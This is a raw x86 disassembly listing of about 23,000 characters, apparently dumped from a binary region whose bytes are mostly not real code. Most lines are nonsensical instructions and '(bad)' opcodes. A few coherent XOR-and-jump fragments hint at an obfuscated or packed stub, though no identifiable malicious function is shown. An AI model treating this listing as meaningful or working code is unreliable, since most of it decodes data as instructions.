  407d01:	imul   ecx,DWORD PTR [ebp+0xde6caf2],0x12404be9
  407d0b:	pop    esi
  407d0c:	jns    0x407ce3
  407d0e:	fs add al,0x52
  407d11:	or     al,0xc5
  407d13:	sub    BYTE PTR [ecx+0x5ad7e0e7],dl
  407d19:	scas   al,BYTE PTR es:[edi]
  407d1a:	mov    DWORD PTR [ecx],edi
  407d1c:	pusha  
  407d1d:	stc    
  407d1e:	and    edi,DWORD PTR [esi+0x3b]
  407d21:	lahf   
  407d22:	test   eax,0xdc9558fd
  407d27:	xchg   ecx,eax
  407d28:	frstor [ebp+0x42]
  407d2b:	cmp    al,0xfc
  407d2d:	test   BYTE PTR [eax],al
  407d2f:	mov    cl,0x6e
  407d31:	mov    ebp,0x954b72d1
  407d36:	sub    ebx,edx
  407d38:	ja     0x407d1e
  407d3a:	pop    ds
  407d3b:	push   es
  407d3c:	fidiv  DWORD PTR es:[edx-0x1e]
  407d40:	jno    0x407d6a
  407d42:	mov    bl,0x90
  407d44:	cwde   
  407d45:	adc    DWORD PTR [ebp+0x4881f8f],ecx
  407d4b:	inc    ebp
  407d4c:	popa   
  407d4d:	mov    esp,0x878f9df5
  407d52:	sbb    al,0x5f
  407d54:	cmp    esi,esi
  407d56:	sub    BYTE PTR ds:[ebx+0x1a54c46a],0x1b
  407d5e:	icebp  
  407d5f:	retf   
  407d60:	les    esi,FWORD PTR [ecx+0x1b]
  407d63:	sar    DWORD PTR [ecx+0x4c],0xae
  407d67:	not    BYTE PTR [ecx+0xa4ed0bb]
  407d6d:	test   DWORD PTR [eax-0x40],0x5e04c3ad
  407d74:	cmp    bl,bl
  407d76:	mov    eax,0x8da7ef1e
  407d7b:	jecxz  0x407d51
  407d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d7e:	scas   eax,DWORD PTR es:[edi]
  407d7f:	adc    ecx,DWORD PTR [edx+eiz*2+0x52]
  407d83:	sbb    DWORD PTR [ebp+edi*2+0x7d353399],ebp
  407d8a:	add    bh,BYTE PTR [eax]
  407d8c:	rcr    DWORD PTR [ebp+0x646e64cc],0x1c
  407d93:	lahf   
  407d94:	(bad)  
  407d95:	out    0x59,eax
  407d97:	jns    0x407dea
  407d99:	or     cl,bh
  407d9b:	ds js  0x407def
  407d9e:	cli    
  407d9f:	je     0x407dce
  407da1:	stos   DWORD PTR es:[edi],eax
  407da2:	xor    esp,DWORD PTR [edi-0x68866730]
  407da8:	call   0x9af78ca1
  407dad:	test   BYTE PTR [ecx+ecx*2+0x34],bl
  407db1:	mov    ds:0x10fdc3ce,al
  407db6:	out    0x2a,eax
  407db8:	inc    DWORD PTR [esi-0x63a498dd]
  407dbe:	gs add eax,0xc63db734
  407dc4:	jmp    0x407e33
  407dc6:	gs or  cl,al
  407dc9:	das    
  407dca:	arpl   WORD PTR [ebp-0x46c2e7e0],si
  407dd0:	xor    DWORD PTR [eax-0x42],ecx
  407dd3:	shr    BYTE PTR cs:[edi-0x17196f01],cl
  407dda:	xchg   ecx,eax
  407ddb:	xchg   ecx,eax
  407ddc:	inc    edx
  407ddd:	js     0x407d69
  407ddf:	sub    DWORD PTR [edx+0x63],edi
  407de2:	das    
  407de3:	or     BYTE PTR [ebx-0x18d11856],dl
  407de9:	adc    dl,ch
  407deb:	call   0x57aa:0xfa757caa
  407df2:	mov    bh,0x4f
  407df4:	enter  0x4a4f,0x1d
  407df8:	add    al,0xcc
  407dfa:	fndisi(8087 only) 
  407dfc:	sbb    DWORD PTR [ebx],0x46
  407dff:	in     eax,dx
  407e00:	push   es
  407e01:	xchg   esp,eax
  407e02:	cs test ecx,ebp
  407e05:	inc    esi
  407e06:	pop    eax
  407e07:	inc    eax
  407e08:	arpl   WORD PTR [ebx],sp
  407e0a:	inc    edx
  407e0b:	xlat   BYTE PTR ds:[ebx]
  407e0c:	push   0x51
  407e0e:	clc    
  407e0f:	mov    ds:0x14669c42,al
  407e14:	aad    0x10
  407e16:	cmp    DWORD PTR [edi+0xae6d5a9],0xc2790b6a
  407e20:	adc    ecx,DWORD PTR [edx-0x17]
  407e23:	pop    es
  407e24:	pop    esp
  407e25:	lahf   
  407e26:	fistp  DWORD PTR ds:0xb49bc38b
  407e2c:	sub    eax,0xa0754b78
  407e31:	fbstp  TBYTE PTR [edx+ecx*8+0x2d]
  407e35:	dec    ecx
  407e36:	sbb    dh,cl
  407e38:	test   DWORD PTR [edx],eax
  407e3a:	rol    BYTE PTR [esi-0x2a],1
  407e3d:	mov    ecx,0xdcebbc3a
  407e42:	call   0x35e4:0x27ff9c52
  407e49:	sti    
  407e4a:	ss pop edi
  407e4c:	mov    ds:0x26d53d2a,al
  407e51:	jge    0x407e5f
  407e53:	and    edx,DWORD PTR [edi+0x213e7f0b]
  407e59:	lock outs dx,DWORD PTR ds:[esi]
  407e5b:	fwait
  407e5c:	(bad)
  407e60:	pop    ebx
  407e61:	inc    ecx
  407e62:	stos   BYTE PTR es:[edi],al
  407e63:	and    edx,ebp
  407e65:	jne    0x407ee4
  407e67:	fistp  QWORD PTR [esi-0xe003a8]
  407e6d:	nop
  407e6e:	add    BYTE PTR [esi],ah
  407e70:	(bad)  
  407e71:	data16 (bad) ds:[edi]
  407e75:	xchg   DWORD PTR [eax],ecx
  407e77:	add    BYTE PTR [eax],al
  407e79:	add    BYTE PTR [ebx-0x11162bab],cl
  407e7f:	or     BYTE PTR [eax],al
  407e81:	add    BYTE PTR [ebx+0x7d8bcc55],cl
  407e87:	cld    
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	jbe    0x407e6d
  407e9f:	mov    al,ds:0x7ecd1104
  407ea4:	jle    0x407e30
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407f0e
  407eaa:	jmp    0x407e9f
  407eac:	dec    esi
  407ead:	aad    0x8c
  407eaf:	jmp    0x5461:0x65797dde
  407eb6:	sbb    ebx,DWORD PTR [eax-0x5d174278]
  407ebc:	repnz push es
  407ebe:	sti    
  407ebf:	jmp    0xca94:0xf0af8959
  407ec6:	xor    bh,BYTE PTR [ecx-0x3d]
  407ec9:	mov    esp,0xa0d4de4a
  407ece:	sub    dl,al
  407ed0:	into   
  407ed1:	mov    dl,0xa1
  407ed3:	xor    eax,0xe9ec0e4e
  407ed8:	push   esi
  407ed9:	out    0x32,eax
  407edb:	jmp    0x407f41
  407edd:	inc    edx
  407ede:	popf   
  407edf:	test   al,0xfb
  407ee1:	outs   dx,BYTE PTR ds:[esi]
  407ee2:	rcr    esi,cl
  407ee4:	call   FWORD PTR [edi+0x504bf643]
  407eea:	aad    0x8b
  407eec:	fisubr DWORD PTR [ebx-0x7a9c2474]
  407ef2:	retf   
  407ef3:	dec    esi
  407ef4:	mov    eax,0xcbf7e6bc
  407ef9:	(bad)  
  407efa:	(bad)  
  407efb:	inc    DWORD PTR [ebx+edi*1]
  407efe:	stos   DWORD PTR es:[edi],eax
  407eff:	cmp    BYTE PTR [ebp-0x7a],0x8d
  407f03:	test   BYTE PTR [edi],ah
  407f05:	jmp    0x77ec:0x7e6b6e02
  407f0c:	or     esp,DWORD PTR [ebx]
  407f0e:	aam    0x6a
  407f10:	ret    0xc592
  407f13:	sbb    esp,DWORD PTR [esi+0x3c]
  407f16:	jge    0x407f37
  407f18:	lock xchg bx,ax
  407f1b:	add    dl,BYTE PTR [esi+ecx*2-0x2]
  407f1f:	mov    ds:0x228dd90a,eax
  407f24:	shl    esi,1
  407f26:	sub    DWORD PTR [edx+0x49a3cc87],esi
  407f2c:	mov    ebp,0x9dd723eb
  407f31:	push   ebp
  407f32:	pop    ebp
  407f33:	cwde   
  407f34:	lods   eax,DWORD PTR ds:[esi]
  407f35:	pop    eax
  407f36:	fidiv  WORD PTR [ebp+0x212207f2]
  407f3c:	loop   0x407f3f
  407f3e:	lock shr DWORD PTR [bp-0x43],0x20
  407f44:	imul   ebx,edx,0xf560f9b4
  407f4a:	inc    edi
  407f4b:	add    DWORD PTR [ebp-0x2c],edx
  407f4e:	mov    dh,0x7b
  407f50:	push   eax
  407f51:	sub    eax,0xeb144e96
  407f56:	rcr    esp,1
  407f58:	cmp    BYTE PTR [edx-0x20],dh
  407f5b:	(bad)
  407f5e:	sub    al,bl
  407f60:	mov    ah,0x1f
  407f62:	lahf   
  407f63:	jg     0x407f1e
  407f65:	aam    0x86
  407f67:	sub    eax,0xa5f07844
  407f6c:	pop    es
  407f6d:	sbb    ebx,DWORD PTR [edx-0x753ec2a3]
  407f73:	call   0x2e59:0x494fe0a1
  407f7a:	idiv   DWORD PTR [edx+0x1c1baa3e]
  407f80:	jo     0x407f9f
  407f82:	inc    ebx
  407f83:	push   esp
  407f84:	jnp    0x407fef
  407f86:	lea    edi,[ecx+0x6a43ad80]
  407f8c:	jb     0x407f67
  407f8e:	inc    esp
  407f8f:	test   DWORD PTR [ebx+0x7d7af568],edx
  407f95:	in     eax,dx
  407f96:	scas   eax,DWORD PTR es:[edi]
  407f97:	das    
  407f98:	add    BYTE PTR [edx-0x43],al
  407f9b:	ret    0x596d
  407f9e:	retf   0x8a2
  407fa1:	setp   BYTE PTR ds:0xefff5840
  407fa8:	xchg   esi,eax
  407fa9:	adc    DWORD PTR [ebx],0x7fd6a334
  407faf:	pop    ss
  407fb0:	pop    ecx
  407fb1:	adc    bh,ch
  407fb3:	rol    DWORD PTR [eax],cl
  407fb5:	sub    eax,0x3799851
  407fba:	out    dx,al
  407fbb:	jo     0x407f8e
  407fbd:	xor    DWORD PTR [edi-0x5],eax
  407fc0:	daa    
  407fc1:	dec    ebp
  407fc2:	out    0x34,eax
  407fc4:	or     DWORD PTR [esi],esp
  407fc6:	sbb    al,0xf
  407fc8:	add    ebx,esi
  407fca:	loope  0x40803f
  407fcc:	pop    ebx
  407fcd:	sbb    al,0x14
  407fcf:	push   cs
  407fd0:	jo     0x408015
  407fd2:	or     BYTE PTR [edi-0x53],al
  407fd5:	lds    ebx,FWORD PTR [ecx-0x60]
  407fd8:	aam    0xdf
  407fda:	jb     0x407f94
  407fdc:	fld    DWORD PTR [eax-0x364bb6dc]
  407fe2:	mov    ecx,0x2cec8956
  407fe7:	inc    edi
  407fe8:	sbb    al,BYTE PTR [ecx]
  407fea:	sti    
  407feb:	jno    0x408047
  407fed:	sahf   
  407fee:	push   cs
  407fef:	out    dx,eax
  407ff0:	add    DWORD PTR [edx+0x5fc696f1],edx
  407ff6:	ins    DWORD PTR es:[edi],dx
  407ff7:	push   es
  407ff8:	pop    eax
  407ff9:	xchg   esp,eax
  407ffa:	dec    ebp
  407ffb:	rcl    BYTE PTR [ebp+0x780d6d19],1
  408001:	push   edi
  408002:	xchg   esi,eax
  408003:	pop    ds
  408004:	add    esp,eax
  408006:	std    
  408007:	loopne 0x408088
  408009:	pop    es
  40800a:	mov    ds:0x584edb24,eax
  40800f:	pop    esp
  408010:	mov    ebp,0x2e7e1e2e
  408015:	je     0x40807c
  408017:	cmp    BYTE PTR [ebp+0x2ee691fa],al
  40801d:	cwde   
  40801e:	xchg   ebx,eax
  40801f:	shl    DWORD PTR [ecx],cl
  408021:	leave  
  408022:	bound  ecx,QWORD PTR [eax+ebx*8]
  408025:	into   
  408026:	int    0x4c
  408028:	ja     0x408080
  40802a:	inc    DWORD PTR [edi]
  40802c:	pop    esi
  40802d:	test   BYTE PTR [ecx+0x5c],0x60
  408031:	das    
  408032:	dec    ecx
  408033:	xchg   ebx,eax
  408034:	sbb    DWORD PTR [ecx-0x20],0x21f4cbd9
  40803b:	daa    
  40803c:	ins    BYTE PTR es:[edi],dx
  40803d:	add    edi,ecx
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	out    dx,al
  40807a:	jmp    0x4080f1
  40807c:	aas    
  40807d:	lods   eax,DWORD PTR ds:[esi]
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x4080ef
  408086:	std    
  408087:	scas   eax,DWORD PTR es:[edi]
  408088:	sbb    BYTE PTR [ecx],dl
  40808a:	out    0x8b,al
  40808c:	lea    ebx,[ebp*2+0x5c1c949e]
  408093:	shl    BYTE PTR [eax+0x46],0xe6
  408097:	pop    eax
  408098:	popf   
  408099:	pop    ebp
  40809a:	mov    ch,al
  40809c:	inc    esp
  40809d:	imul   bh
  40809f:	and    BYTE PTR [esi-0x10],dl
  4080a2:	cmc    
  4080a3:	pop    ebx
  4080a4:	mov    ds:0x849b76ac,eax
  4080a9:	repz mov al,0x29
  4080ac:	jns    0x408070
  4080ae:	in     eax,0x61
  4080b0:	xchg   ebx,eax
  4080b1:	dec    ecx
  4080b2:	pop    ebp
  4080b3:	(bad)  
  4080b4:	sahf   
  4080b5:	loopne 0x4080fc
  4080b7:	xor    eax,0x9f9c6e9
  4080bc:	xchg   ecx,eax
  4080bd:	std    
  4080be:	or     ebp,edx
  4080c0:	xor    DWORD PTR [edx],ebx
  4080c2:	add    eax,0xce78ab84
  4080c7:	in     al,dx
  4080c8:	pushf  
  4080c9:	mov    dl,0xaf
  4080cb:	in     al,dx
  4080cc:	(bad)  
  4080cf:	les    edx,FWORD PTR [ebp-0xd73723]
  4080d5:	jp     0x40813b
  4080d7:	hlt    
  4080d8:	repnz sbb al,0xa2
  4080db:	dec    esi
  4080dc:	lods   al,BYTE PTR ds:[esi]
  4080dd:	(bad)  
  4080de:	push   esi
  4080df:	jl     0x408156
  4080e1:	(bad)  
  4080e2:	mov    ebp,?
  4080e4:	inc    ebx
  4080e5:	popf   
  4080e6:	rcl    bh,1
  4080e8:	mov    ch,0x4a
  4080ea:	repz shl DWORD PTR [eax+0x1ae980ef],0xc8
  4080f2:	fdivr  DWORD PTR [ebx-0x30]
  4080f5:	mov    ch,al
  4080f7:	ins    DWORD PTR es:[edi],dx
  4080f8:	fisub  DWORD PTR [ecx]
  4080fa:	dec    esi
  4080fb:	cli    
  4080fc:	sar    DWORD PTR [edx+0x5e],cl
  4080ff:	mov    WORD PTR [ecx+0x13],cs
  408102:	mov    eax,ds:0x4474890c
  408107:	jo     0x40817d
  408109:	pop    ds
  40810a:	inc    ecx
  40810b:	sbb    BYTE PTR [ecx+0x5f14c9f6],ah
  408111:	jl     0x4080cf
  408113:	and    BYTE PTR [edx+0x13450ffb],ch
  408119:	aas    
  40811a:	add    esi,edi
  40811c:	hlt    
  40811d:	repz mov bh,0x66
  408120:	xchg   ecx,eax
  408121:	stc    
  408122:	cli    
  408123:	mov    ch,0xa9
  408125:	clc    
  408126:	test   al,0xa0
  408128:	sbb    eax,eax
  40812a:	rcr    cl,cl
  40812c:	(bad)  
  40812e:	loop   0x40815c
  408130:	lds    edx,FWORD PTR [eax]
  408132:	scas   eax,DWORD PTR es:[edi]
  408133:	or     BYTE PTR [ebx+0x5d7e0afe],bl
  408139:	xor    eax,0x543ee8a4
  40813e:	into   
  40813f:	neg    al
  408141:	aam    0xb3
  408143:	mov    DWORD PTR [esi-0x7f],ebp
  408146:	pop    edi
  408147:	inc    ecx
  408148:	(bad)  
  408149:	sbb    DWORD PTR cs:[ecx],esi
  40814c:	adc    ebx,eax
  40814e:	dec    ecx
  40814f:	xchg   BYTE PTR [edi+ecx*4-0xe],dh
  408153:	cmp    edi,DWORD PTR gs:[ebx+0x10]
  408157:	gs jecxz 0x40814f
  40815a:	xchg   edx,eax
  40815b:	push   esp
  40815c:	outs   dx,DWORD PTR ds:[esi]
  40815d:	gs inc ebx
  40815f:	imul   esp,DWORD PTR [esi],0xffffff9b
  408162:	sti    
  408163:	add    eax,0x934b6f69
  408168:	jp     0x4080f9
  40816a:	xor    eax,0x5b3469e0
  40816f:	add    DWORD PTR [ebx],0x12
  408172:	mov    ch,0xeb
  408174:	lahf   
  408175:	or     DWORD PTR [ecx-0x1b],esi
  408178:	ins    BYTE PTR es:[edi],dx
  408179:	jae    0x4081fa
  40817b:	sbb    bl,BYTE PTR [ebx-0x41]
  40817e:	push   es
  40817f:	inc    esi
  408180:	mov    ebx,0xd0928e20
  408185:	test   eax,0x292aa7c
  40818a:	fistp  DWORD PTR ds:0x199d4f0
  408190:	jns    0x408131
  408192:	retf   
  408193:	lock cdq 
  408195:	jl     0x4081e8
  408197:	jmp    0x40816f
  408199:	sbb    DWORD PTR [ebx*4+0x1b6748dc],eax
  4081a0:	pop    esp
  4081a1:	mov    DWORD PTR [eax+0x45],esp
  4081a4:	xchg   edx,eax
  4081a5:	push   ecx
  4081a6:	outs   dx,BYTE PTR ds:[esi]
  4081a7:	jp     0x408194
  4081a9:	scas   al,BYTE PTR es:[edi]
  4081aa:	mov    gs,esp
  4081ac:	push   ds
  4081ad:	mov    WORD PTR [eax-0x559c2185],ds
  4081b3:	mov    cl,0xae
  4081b5:	mov    ss,WORD PTR [edi]
  4081b7:	jbe    0x4081ed
  4081b9:	sti    
  4081ba:	inc    ecx
  4081bb:	sete   BYTE PTR [esi]
  4081be:	adc    eax,0x5af14e95
  4081c3:	test   al,0x85
  4081c5:	in     al,0xe9
  4081c7:	jp     0x4081f0
  4081c9:	and    DWORD PTR [ebx],0xffffffb7
  4081cc:	(bad)  
  4081cd:	imul   ebx,DWORD PTR [ebx-0x2797ccde],0xa8f38116
  4081d7:	test   DWORD PTR [edi],edi
  4081d9:	sub    DWORD PTR [edi-0x10],esi
  4081dc:	add    DWORD PTR [edx+0x61],ebx
  4081df:	jmp    0xeefbedcb
  4081e4:	jmp    0xba2e:0x5a696f60
  4081eb:	imul   edi,DWORD PTR [ebp+0x778a3939],0x941f1ad5
  4081f5:	pop    ss
  4081f6:	std    
  4081f7:	test   BYTE PTR gs:[edi+edi*1+0x7ce5a7b4],bh
  4081ff:	sub    dh,BYTE PTR [eax-0x266acc80]
  408205:	data16 icebp 
  408207:	push   ss
  408208:	int3   
  408209:	retf   0x48b6
  40820c:	xchg   ecx,eax
  40820d:	cmp    eax,0x39b00528
  408212:	xor    cl,bl
  408214:	jbe    0x4081df
  408216:	in     al,dx
  408217:	jp     0x408236
  408219:	add    edx,ecx
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x3937:0x7d73362
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x40826c
  408239:	and    BYTE PTR [ebx+0x7f92510e],ch
  40823f:	mov    BYTE PTR [ebx*1-0x491225f],bh
  408246:	fwait
  408247:	adc    BYTE PTR [eax],0xf3
  40824a:	test   al,0xd1
  40824c:	inc    edx
  40824d:	cmp    al,BYTE PTR [ebp+0xe97a002]
  408253:	setnp  BYTE PTR [esi]
  408256:	jmp    0xca32cd66
  40825b:	add    eax,0x749f35da
  408260:	in     al,0xa0
  408262:	addr16 arpl si,cx
  408265:	icebp  
  408266:	push   ds
  408267:	and    eax,0x666a2408
  40826c:	xchg   ecx,eax
  40826d:	cs in  eax,0xf8
  408270:	inc    ecx
  408271:	cld    
  408272:	mov    ecx,0xc5737e91
  408277:	test   al,0xc7
  408279:	imul   ebp,DWORD PTR [ecx-0x2b5e8226],0x52
  408280:	pop    ds
  408281:	sbb    al,0x31
  408283:	xchg   ebx,eax
  408284:	xchg   ebp,eax
  408285:	ins    BYTE PTR es:[edi],dx
  408286:	(bad)  
  408288:	ret    0xb652
  40828b:	in     al,dx
  40828c:	xor    eax,0x12a3c657
  408291:	enter  0xbaaf,0x6a
  408295:	xor    bh,0x24
  408298:	into   
  408299:	jns    0x408262
  40829b:	mov    ch,0xd4
  40829d:	(bad)  
  40829e:	repz out dx,eax
  4082a0:	inc    esi
  4082a1:	inc    ebx
  4082a2:	les    esp,FWORD PTR [esp+ebp*2+0x25]
  4082a6:	pop    ebx
  4082a7:	push   0x956d54ba
  4082ac:	hlt    
  4082ad:	test   al,0xe3
  4082af:	dec    edi
  4082b0:	mov    ds:0x766ec9a6,eax
  4082b5:	jecxz  0x4082d4
  4082b7:	pop    eax
  4082b8:	dec    esp
  4082b9:	pop    ebx
  4082ba:	stos   BYTE PTR es:[edi],al
  4082bb:	xchg   esp,eax
  4082bc:	jecxz  0x408246
  4082be:	mov    eax,0xfdaaa829
  4082c3:	mov    bh,0xde
  4082c5:	data16 stc 
  4082c7:	call   0xe219:0xe40ef866
  4082ce:	pop    es
  4082cf:	push   ebx
  4082d0:	push   es
  4082d1:	dec    edx
  4082d2:	lea    bp,[edx+0x1f]
  4082d6:	inc    edi
  4082d7:	xchg   ebp,eax
  4082d8:	mov    esi,0xe2f4731d
  4082dd:	fdivr  DWORD PTR [edx-0x13e25679]
  4082e3:	aaa    
  4082e4:	call   0xb490b4a6
  4082e9:	xchg   ecx,eax
  4082ea:	jno    0x408316
  4082ec:	je     0x4082f9
  4082ee:	jnp    0x408316
  4082f0:	loope  0x408290
  4082f2:	push   edi
  4082f3:	test   al,0xc4
  4082f5:	repz dec ecx
  4082f7:	aam    0xa1
  4082f9:	xchg   ebp,eax
  4082fa:	adc    al,0x12
  4082fc:	push   ebp
  4082fd:	or     bh,BYTE PTR [esi+0x3de0459d]
  408303:	adc    BYTE PTR ds:0xdfd34ca5,cl
  408309:	mov    ch,0x90
  40830b:	jne    0x4082a1
  40830d:	xor    esp,DWORD PTR [edx]
  40830f:	dec    ebp
  408310:	dec    ebp
  408311:	popf   
  408312:	ret    
  408313:	cdq    
  408314:	sub    eax,0x62708553
  408319:	outs   dx,BYTE PTR ds:[esi]
  40831a:	ins    DWORD PTR es:[edi],dx
  40831b:	mov    cl,0x88
  40831d:	arpl   WORD PTR [ebx],bx
  40831f:	in     al,dx
  408320:	dec    edi
  408321:	cmp    ch,BYTE PTR [eax-0x62]
  408324:	cmp    dh,BYTE PTR [ebx+ebp*2]
  408327:	cmp    BYTE PTR [ecx],al
  408329:	js     0x408394
  40832b:	or     al,0xce
  40832d:	push   edi
  40832e:	outs   dx,DWORD PTR ds:[esi]
  40832f:	test   DWORD PTR [ecx+0x3b],edi
  408332:	(bad)  
  408333:	lds    eax,FWORD PTR [ebx-0x4f]
  408336:	xchg   ecx,eax
  408337:	rcr    cl,0x7b
  40833a:	cdq    
  40833b:	dec    edx
  40833c:	ins    DWORD PTR es:[edi],dx
  40833d:	mov    DWORD PTR [ecx],ebp
  40833f:	fwait
  408340:	jno    0x4082d5
  408342:	fadd   st(4),st
  408344:	mov    ebx,esp
  408346:	and    al,0x23
  408348:	loopne 0x408361
  40834a:	inc    ebp
  40834b:	or     eax,0x8ee0bebb
  408350:	fidiv  WORD PTR [edx-0x4b]
  408353:	sbb    al,ah
  408355:	pop    ebx
  408356:	mov    eax,ds:0xe771c084
  40835b:	(bad)  
  40835c:	out    0x93,al
  40835e:	mov    ch,0xcf
  408360:	xor    eax,0xfb15162f
  408365:	stc    
  408366:	mov    edx,0x78ee84d9
  40836b:	sti    
  40836c:	fwait
  40836d:	sub    eax,esp
  40836f:	clc    
  408370:	in     al,dx
  408371:	pop    esi
  408372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408373:	cwde   
  408374:	or     eax,0xf46b0ae
  408379:	mov    bl,0xd6
  40837b:	pop    edi
  40837c:	mov    edi,0x4b3d5f51
  408381:	sub    DWORD PTR [edx+0x25],esi
  408384:	cmp    edx,DWORD PTR [ebp+0x11]
  408387:	sahf   
  408388:	ret    0x7d72
  40838b:	and    al,0x94
  40838d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40838e:	adc    esp,DWORD PTR [ebx+0x9]
  408391:	ror    BYTE PTR [ecx-0x109daf1b],cl
  408397:	sub    ebp,DWORD PTR [edi]
  408399:	retf   0xc4c1
  40839c:	clc    
  40839d:	stos   DWORD PTR es:[edi],eax
  40839e:	out    0xf5,al
  4083a0:	inc    edx
  4083a1:	mov    ebp,0x592d0666
  4083a6:	out    dx,eax
  4083a7:	mov    ebp,0x7dfb7d9d
  4083ac:	(bad)  [edx+ecx*8-0x241f8a1d]
  4083b3:	rcr    bh,1
  4083b5:	mov    ebx,0x2788242e
  4083ba:	sbb    eax,0x8f1f12eb
  4083bf:	push   ebp
  4083c0:	jbe    0x4083f2
  4083c2:	push   ebx
  4083c3:	(bad)  
  4083c4:	or     eax,0xdab52d0f
  4083c9:	ins    BYTE PTR es:[edi],dx
  4083ca:	add    eax,0xd7af0f5c
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	pop    edi
  4083e9:	xor    al,BYTE PTR ds:0x7ec955ac
  4083ef:	jle    0x40837b
  4083f1:	jg     0x408471
  4083f3:	jle    0x4083bf
  4083f5:	ins    BYTE PTR es:[edi],dx
  4083f6:	leave  
  4083f7:	cmp    dl,BYTE PTR [edx]
  4083f9:	add    al,0x27
  4083fb:	sbb    eax,0x8a476f36
  408400:	fwait
  408401:	dec    esi
  408402:	xor    DWORD PTR [eax+0x6540a49c],ecx
  408408:	push   ebx
  408409:	scas   al,BYTE PTR es:[edi]
  40840a:	push   ebp
  40840b:	and    dl,BYTE PTR [eax]
  40840d:	cmp    ch,BYTE PTR [edi+edi*8+0x50d98521]
  408414:	inc    ebp
  408415:	cmc    
  408416:	adc    al,0x7d
  408418:	ins    DWORD PTR es:[edi],dx
  408419:	imul   edx,DWORD PTR [ebp+0x7f],0x7b
  40841d:	mov    ecx,es
  40841f:	ret    0x8b48
  408422:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408424:	push   0xffffff84
  408426:	push   edi
  408427:	jmp    0x66c3:0xb5ff2f1d
  40842e:	xlat   BYTE PTR ds:[ebx]
  40842f:	fisttp QWORD PTR [ebx-0x3f]
  408432:	aad    0x72
  408434:	or     eax,0x3bbe1163
  408439:	retf   0x959d
  40843c:	clc    
  40843d:	fs mov ebp,0xa65027e3
  408443:	gs cmp al,0x67
  408446:	adc    cl,BYTE PTR [eax+ebx*8]
  408449:	mov    ax,0x3f0f
  40844d:	pop    eax
  40844e:	out    dx,al
  40844f:	xchg   ecx,eax
  408450:	or     al,0x49
  408452:	pop    ds
  408453:	add    al,0x96
  408455:	icebp  
  408456:	mov    bh,0xe
  408458:	ret    0xc408
  40845b:	clc    
  40845c:	adc    BYTE PTR [edi+0xb7467f9],al
  408462:	cmp    BYTE PTR [edx],0x8b
  408465:	imul   BYTE PTR [edi+0x719a5027]
  40846b:	mov    esp,DWORD PTR [edi]
  40846d:	sub    BYTE PTR [ebx+0x34d2c655],0x9d
  408474:	loope  0x408467
  408476:	not    DWORD PTR [ecx-0x7a8b5a27]
  40847c:	sbb    bh,ch
  40847e:	add    ebp,DWORD PTR [ebp-0x7123b906]
  408484:	or     eax,0x9c8b8393
  408489:	jno    0x408508
  40848b:	xor    al,0x79
  40848d:	scas   al,BYTE PTR es:[edi]
  40848e:	test   DWORD PTR [ecx-0x70],eax
  408491:	in     al,dx
  408492:	sub    DWORD PTR cs:[ebx+ebp*2-0x4b7ebe0b],edx
  40849a:	xor    al,0x5a
  40849c:	pop    edx
  40849d:	xor    DWORD PTR [eax],eax
  40849f:	lahf   
  4084a0:	adc    ebx,DWORD PTR [edx-0x29]
  4084a3:	arpl   WORD PTR [bp+si-0x3d],bp
  4084a7:	push   ss
  4084a8:	xchg   ebp,eax
  4084a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084aa:	ins    BYTE PTR es:[edi],dx
  4084ab:	push   ss
  4084ac:	mov    dl,0xa0
  4084ae:	adc    eax,0x7b1f28ca
  4084b3:	ret    
  4084b4:	nop
  4084b5:	cmp    al,0x5c
  4084b7:	popf   
  4084b8:	or     al,0x52
  4084ba:	sbb    bh,BYTE PTR [edi]
  4084bc:	gs jp  0x40849b
  4084bf:	es dec ecx
  4084c1:	mov    al,ds:0x4e237ad5
  4084c6:	fld    TBYTE PTR [ebp+0x274f010c]
  4084cc:	dec    ebx
  4084cd:	test   eax,0x46d3b89a
  4084d2:	in     eax,dx
  4084d3:	jmp    0x40854e
  4084d5:	sbb    dl,ch
  4084d7:	dec    edx
  4084d8:	mov    eax,ds:0x49966ed5
  4084dd:	or     al,0x2a
  4084df:	xlat   BYTE PTR ds:[ebx]
  4084e0:	hlt    
  4084e1:	stc    
  4084e2:	dec    ebp
  4084e3:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084e5:	js     0x40846d
  4084e7:	popa   
  4084e8:	mov    ecx,0xfb401e44
  4084ed:	imul   BYTE PTR [ecx]
  4084ef:	mov    ecx,0x8d0f5f11
  4084f4:	mov    ebx,0x1ecccfb0
  4084f9:	dec    eax
  4084fa:	arpl   WORD PTR [esi-0x3a26db43],ax
  408500:	xor    ecx,DWORD PTR [ecx+eiz*1-0x1beb36ba]
  408507:	inc    eax
  408508:	inc    esp
